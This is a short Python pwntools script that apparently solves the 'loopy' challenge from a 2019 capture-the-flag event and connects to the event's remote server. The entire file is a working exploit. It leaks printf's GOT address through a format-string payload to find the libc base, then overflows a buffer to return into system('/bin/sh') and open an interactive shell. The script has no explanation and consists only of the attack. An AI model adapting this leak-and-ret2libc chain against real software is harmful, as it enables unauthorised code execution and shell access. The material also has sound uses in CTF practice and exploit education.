from pwn import *

e = ELF("./loopy")
libc = ELF("./libc.so.6")

#p = process(e.path)
p = remote("shell.2019.nactf.com", 31283)

print("{:#x}".format(e.got["printf"]))
payload = ""
payload += "STA%8$sEND".ljust(16)
payload += p32(e.got["printf"]) # \x58\x12\x60\x00\x00\x00\x00\x00
payload = payload.ljust(0x48) + "A" * 4 + p32(e.symbols["vuln"])

p.sendline(payload)

p.recvuntil("STA")
base = u32(p.recvuntil("END", drop=True)[:4]) - libc.symbols["printf"]

payload = ""
payload = payload.ljust(0x48) + "A" * 4 + p32(base + libc.symbols["system"]) + "A" * 4 + p32(base + next(libc.search("/bin/sh")))

p.sendline(payload)

p.interactive()
